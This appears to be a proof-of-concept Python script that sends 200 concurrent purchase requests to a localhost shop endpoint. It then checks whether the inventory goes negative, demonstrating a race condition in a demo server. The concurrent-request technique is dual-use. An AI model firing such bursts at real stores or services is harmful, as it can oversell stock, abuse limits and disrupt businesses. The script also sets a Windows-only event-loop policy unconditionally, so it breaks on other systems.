import asyncio
import aiohttp
import time

# The endpoint we want to break
URL = "http://127.0.0.1:8000/buy/smart/1"
INVENTORY_URL = "http://127.0.0.1:8000/inventory/1"

# We have 100 items, but we will send 200 requests simultaneously
CONCURRENT_REQUESTS = 200 

async def buy_item(session, request_id):
    try:
        async with session.post(URL) as response:
            await response.text()
            return response.status
    except Exception as e:
        print(f"Request {request_id} failed: {e}")

async def get_inventory(session):
    async with session.get(INVENTORY_URL) as response:
        data = await response.json()
        print(f"📦 Current Inventory: {data['inventory']}")
        return data['inventory']

async def main():
    async with aiohttp.ClientSession() as session:
        # Check starting stock
        print("--- BEFORE ATTACK ---")
        await get_inventory(session)

        print(f"\n⚡ Launching {CONCURRENT_REQUESTS} buyers at the EXACT same time...")
        tasks = []
        
        start_time = time.time()
        for i in range(CONCURRENT_REQUESTS):
            tasks.append(buy_item(session, i))
        
        # This fires all requests simultaneously
        responses = await asyncio.gather(*tasks)
        duration = time.time() - start_time
        
        print(f"✅ Attack finished in {duration:.2f} seconds")
        
        # Check final stock
        print("\n--- AFTER ATTACK ---")
        final_stock = await get_inventory(session)
        
        if final_stock < 0:
            print(f"🚨 FAILURE! We oversold by {abs(final_stock)} items! (Race Condition Proven)")
        else:
            print("System survived... (Try increasing requests or latency)")

if __name__ == "__main__":
    # Fix for Windows users
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())